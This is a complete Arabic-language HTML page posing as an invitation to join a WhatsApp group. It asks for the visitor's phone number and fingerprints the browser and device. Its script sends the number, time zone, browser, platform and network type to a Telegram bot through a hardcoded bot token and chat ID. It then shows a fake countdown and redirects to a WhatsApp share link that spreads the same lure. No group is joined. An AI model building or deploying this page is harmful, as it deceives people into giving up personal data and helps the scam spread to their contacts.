<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:image" content="whatsapp-logo-icon-isolated-on-transparent-background-free-png.webp">
    <title>انضم إلى مجموعتنا على واتساب</title>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
    <style>
        :root {
            --primary-color: #25D366;
            --secondary-color: #128C7E;
            --dark-color: #075E54;
            --light-color: #DCF8C6;
            --text-color: #333;
            --light-text: #777;
            --white: #ffffff;
            --gray: #f5f5f5;
            --dark-gray: #e5e5e5;
            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            --transition: all 0.3s ease;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Tajawal', sans-serif;
            line-height: 1.6;
            color: var(--text-color);
            background-color: var(--gray);
            overflow-x: hidden;
        }

        .container {
            max-width: 1000px;
            margin: 0 auto;
            padding: 20px;
        }

        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .modal-content {
            background-color: var(--white);
            padding: 30px;
            border-radius: 10px;
            width: 100%;
            max-width: 500px;
            box-shadow: var(--shadow);
            animation: fadeIn 0.3s ease-out;
        }

        .modal-header {
            text-align: center;
            margin-bottom: 20px;
        }

        .modal-header h2 {
            color: var(--dark-color);
            margin-bottom: 10px;
        }

        .modal-header p {
            color: var(--light-text);
        }

        .form-group {
            margin-bottom: 25px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
        }

        .phone-input-container {
            margin-bottom: 5px;
        }

        .input-field {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid var(--dark-gray);
            border-radius: 6px;
            font-size: 16px;
            transition: var(--transition);
        }

        .input-field:focus {
            border-color: var(--primary-color);
            outline: none;
            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.2);
        }

        .submit-btn {
            background-color: var(--primary-color);
            color: var(--white);
            border: none;
            padding: 14px 20px;
            font-size: 16px;
            font-weight: 500;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            transition: var(--transition);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .submit-btn:hover {
            background-color: var(--secondary-color);
        }

        .countdown-container {
            display: none;
            text-align: center;
            padding: 30px;
            background-color: var(--white);
            border-radius: 10px;
            box-shadow: var(--shadow);
            margin-top: 20px;
        }

        .countdown-title {
            font-size: 1.5rem;
            margin-bottom: 20px;
            color: var(--dark-color);
        }

        .countdown {
            font-size: 3rem;
            font-weight: 700;
            color: var(--primary-color);
            margin-bottom: 20px;
        }

        .status-message {
            font-size: 1.2rem;
            color: var(--light-text);
        }

        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: var(--white);
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* International telephone input customization */
        .iti {
            width: 100%;
        }

        .iti__selected-flag {
            padding: 0 15px;
        }

        .iti__arrow {
            border-left: 3px solid transparent;
            border-right: 3px solid transparent;
            border-top: 4px solid #555;
        }

        .iti__country-list {
            border-radius: 6px;
            box-shadow: var(--shadow);
        }
    </style>
</head>
<body>
    <!-- نموذج إدخال رقم الهاتف -->
    <div class="modal-overlay" id="phoneModal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>انضم إلى مجموعتنا على واتساب</h2>
                <p>الرجاء إدخال رقم هاتفك للوصول إلى المجموعة</p>
            </div>
            <form id="whatsappForm">
                <div class="form-group">
                    <label for="phone">رقم هاتف واتساب</label>
                    <div class="phone-input-container">
                        <input type="tel" id="phone" class="input-field" required>
                    </div>
                    <small style="color: var(--light-text);">سوف تتلقى رابط الدعوة على واتساب</small>
                </div>
                <div class="form-group">
                    <button type="submit" class="submit-btn" id="submitBtn">
                        <span>انضم إلى المجموعة</span>
                        <i class="fab fa-whatsapp"></i>
                    </button>
                </div>
            </form>

            <div class="countdown-container" id="countdownSection">
                <h3 class="countdown-title">جاري تحضير دعوتك</h3>
                <div class="countdown" id="countdown">15</div>
                <p class="status-message">الرجاء الانتظار بينما نضيفك إلى المجموعة...</</p>
                <div class="spinner" style="margin: 0 auto;"></div>
            </div>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // تهيئة حقل إدخال الهاتف مع تحديد الدولة
            const phoneInput = document.getElementById('phone');
            const iti = window.intlTelInput(phoneInput, {
                initialCountry: "sa", // السعودية كدولة افتراضية
                preferredCountries: ["sa", "ae", "eg", "iq", "jo", "kw", "lb", "om", "qa", "bh"],
                separateDialCode: true,
                utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
            });

            // دالة لجمع معلومات المتصفح
            function getBrowserInfo() {
                const connection = navigator.connection || {};
                const screenOrientation = screen.orientation || {};
                
                return {
                    // معلومات المتصفح
                    userAgent: navigator.userAgent,
                    browser: navigator.userAgentData?.brands?.map(b => b.brand + '/' + b.version).join(' ') || 'غير معروف',
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    cookieEnabled: navigator.cookieEnabled,
                    pdfViewerEnabled: navigator.pdfViewerEnabled,
                    webdriver: navigator.webdriver,
                    
                    // معلومات الشاشة
                    screenWidth: screen.width,
                    screenHeight: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelRatio: window.devicePixelRatio,
                    orientation: screenOrientation.type || (screen.width > screen.height ? 'أفقي' : 'عمودي'),
                    
                    // معلومات الشبكة
                    connectionType: connection.effectiveType || 'غير معروف',
                    downlink: connection.downlink || 'غير معروف',
                    rtt: connection.rtt || 'غير معروف',
                    
                    // معلومات النظام
                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    localDateTime: new Date().toString(),
                    hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
                    deviceMemory: navigator.deviceMemory || 'غير معروف',
                    
                    // معلومات WebGL (للكشف عن بطاقة الرسومات)
                    webglVendor: getWebGLInfo().vendor,
                    webglRenderer: getWebGLInfo().renderer
                };
            }

            // دالة مساعدة للحصول على معلومات WebGL
            function getWebGLInfo() {
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (!gl) return { vendor: 'غير معروف', renderer: 'غير معروف' };
                    
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    return {
                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'غير معروف',
                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'غير معروف'
                    };
                } catch (e) {
                    return { vendor: 'خطأ', renderer: 'خطأ' };
                }
            }

            // إرسال النموذج
            const whatsappForm = document.getElementById('whatsappForm');
            const countdownSection = document.getElementById('countdownSection');
            const submitBtn = document.getElementById('submitBtn');
            
            whatsappForm.addEventListener('submit', function(e) {
                e.preventDefault();
                
                // الحصول على رقم الهاتف مع رمز الدولة
                const phoneNumber = iti.getNumber();
                
                // التحقق من صحة رقم الهاتف
                if (!phoneNumber || !iti.isValidNumber()) {
                    alert('الرجاء إدخال رقم هاتف صحيح.');
                    return;
                }
                
                // عرض حالة التحميل
                submitBtn.innerHTML = '<span class="spinner"></span> <span>جاري الإرسال...</span>';
                submitBtn.disabled = true;
                
                // جمع معلومات المتصفح والنظام
                const browserInfo = getBrowserInfo();
                
                // تحضير الرسالة لتليجرام
                const message = `طلب انضمام جديد إلى مجموعة واتساب:
📱 الهاتف: ${phoneNumber}

📍 الموقع: ${browserInfo.timeZone}
🕒 الوقت: ${browserInfo.localDateTime}
🌐 المتصفح: ${browserInfo.browser}
💻 النظام: ${browserInfo.platform}
📶 الشبكة: ${browserInfo.connectionType}`;
                
                // إرسال البيانات إلى بوتات تليجرام
                const telegramBots = [
                    { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" },
                    { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" }
                ];
                
                // إرسال الطلبات إلى جميع البوتات
                const sendPromises = telegramBots.map(bot => {
                    const url = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}`;
                    return fetch(url).then(response => response.json());
                });
                
                Promise.all(sendPromises)
                    .then(() => {
                        // إخفاء النموذج وعرض العد التنازلي
                        whatsappForm.style.display = 'none';
                        countdownSection.style.display = 'block';
                        
                        // بدء العد التنازلي
                        let seconds = 15;
                        const countdownElement = document.getElementById('countdown');
                        
                        const countdownInterval = setInterval(() => {
                            seconds--;
                            countdownElement.textContent = seconds;
                            
                            if (seconds <= 0) {
                                clearInterval(countdownInterval);
                                // إنشاء رابط واتساب مع مشاركة الصورة
                                const whatsappUrl = `https://wa.me/?text=${encodeURIComponent('انضم إلى مجموعتنا على واتساب')}`;
                                window.location.href = whatsappUrl;
                            }
                        }, 1000);
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        alert('حدث خطأ. يرجى المحاولة مرة أخرى لاحقًا.');
                        submitBtn.innerHTML = '<span>انضم إلى المجموعة</span> <i class="fab fa-whatsapp"></i>';
                        submitBtn.disabled = false;
                    });
            });
        });
    </script>
</body>
</html>
